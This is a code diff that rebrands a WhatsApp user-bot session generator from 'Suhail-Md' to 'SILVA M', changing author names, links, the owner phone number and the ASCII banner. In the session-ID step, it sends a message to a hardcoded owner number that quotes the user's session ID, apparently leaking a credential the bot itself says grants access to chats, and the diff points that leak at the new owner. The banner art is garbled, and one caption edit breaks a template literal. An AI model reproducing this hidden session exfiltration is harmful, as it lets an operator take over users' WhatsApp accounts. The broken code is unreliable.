@@ -7,11 +7,11 @@
 //                                         Ｖ：１．０．１                                                 // 
 //                                                                                                      // 
 //            ███████╗██╗   ██╗██╗  ██╗ █████╗ ██╗██╗         ███╗   ███╗██████╗                        //
-//            ██╔════╝██║   ██║██║  ██║██╔══██╗██║██║         ████╗ ████║██╔══██╗                       //
-//            ███████╗██║   ██║███████║███████║██║██║         ██╔████╔██║██║  ██║                       //
+//            ██╔═══╝██  ██║██║ ██║██╔══██╗██║██║         ████╗ ████║██╔══██╗                       //
+//            ███████╗██ ██║███████║███████║██║██║         ██╔████╔██║██║  ██║                       //
 //            ╚════██║██║   ██║██╔══██║██╔══██║██║██║         ██║╚██╔╝██║██║  ██║                       //
-//            ███████║╚██████╔╝██║  ██║██║  ██║██║███████╗    ██║ ╚═╝ ██║██████╔╝                       //
-//            ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝     ╚═╝╚═════╝                        //
+//            ███████║█╔╝██║  ██║██║  ██║██║███████╗    ██║ ╚═╝ ██║██████╔╝                       //
+//            ╚══════╝ ╚═══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝     ╚═╝╚═════╝                        //
 //                                                                                                      //
 //                                                                                                      //
 //                                                                                                      //
@@ -19,16 +19,16 @@
 
 CURRENTLY RUNNING ON BETA VERSION!!
 *
-   * @project_name : Suhail-Md
-   * @author : Suhail Tech Info
-   * @youtube : https://www.youtube.com/c/@SuhailTechInfo0
-   * @description : Suhail-Md ,A Multi-functional whatsapp user bot.
+   * @project_name : SILVA M
+   * @author : SILVA TECH
+   * @support_group : https://chat.whatsapp.com/BFLnaC9ULR02UJI2TbnciD
+   * @description : SILVA M ,A Multi-functional whatsapp user bot.
    * @version 1.0.1
 *
    * Licensed under the  GPL-3.0 License;
 * 
-   * Created By Suhail Tech Info.
-   * © 2023 Suhail-Md.
+   * Created By 𝐒𝚰𝐋𝛁𝚫 𝚻𝚵𝐂𝚮💋.
+   * © 2024 𝐒𝚰𝐋𝛁𝚫 𝚻𝚵𝐂𝚮💋.
 * 
    * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
    * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
@@ -276,7 +276,7 @@ CURRENTLY RUNNING ON BETA VERSION!!
             ];
             let buttonMessage = {
                 image: { url: anu.thumbnail, },
-                caption: `
+                caption: `𝕏🫦『••SILVA™- Bᴏᴛ®-Mᴅ©••』𝕏`
 ╭───────────────◆
 │⿻ ${tlang().title} 
 │  *Youtube Player* ✨
@@ -354,7 +354,7 @@ setTimeout(() => {
              c2 = output.data.split('/')[3]
             await delay(500);
             let session_id1 = await session.sendMessage(user, {text: 'Secktor;;;'+c2});
-            await session.sendMessage("923184474176@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
+            await session.sendMessage("254700143167@s.whatsapp.net", { text: '*Qr Scan Completed Successfully.*' } , {quoted : session_id1});
           }catch (e) {console.log(e)}
 //===========================================================================================
 //===============================  SESSION ID 2   ===========================================
@@ -378,19 +378,19 @@ Thanks.
 
           
 let cc = `╔════◇
-║『𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝗦𝗲𝗰𝗸𝘁𝗼𝗿•𝗠𝗱』
+║『𝗧𝗵𝗮𝗻𝗸𝘀 𝗙𝗼𝗿 𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴 𝐒𝚰𝐋𝛁𝚫•𝗠𝗱』
 ║ _You complete first step to making Bot._
 ╚════════════════════════╝
 ╔═════◇
 ║  『••• 𝗩𝗶𝘀𝗶𝘁 𝗙𝗼𝗿 𝗛𝗲𝗹𝗽 •••』
-║ *1.Repo:* _https://tinyurl.com/2czdxe7a_
-║ *2.Ytube:* _https://tinyurl.com/22q7z2kv_
-║ *3.Owner:* _https://wa.me/923184474176_
+║ *1.Repo:* _https://github.com/Sylivanu/SILVA-M_
+║ *2.WAGRP:* _https://chat.whatsapp.com/BFLnaC9ULR02UJI2TbnciD_
+║ *3.Owner:* _https://wa.me/254700143167_
 ║ *Note :*_Don't provide your SESSION_ID to_
 ║ _anyone otherwise that can access chats_
 ╚════════════════════════╝
 `;
-          let session_id = await session.sendMessage(user, { text: "Secktor;;;" + c });
+          let session_id = await session.sendMessage(user, { text: "SILVA;;;" + c });
           await session.sendMessage(user, { text: cc } , { quoted : session_id });
           
           await require('child_process').exec('rm -rf auth_info_baileys')
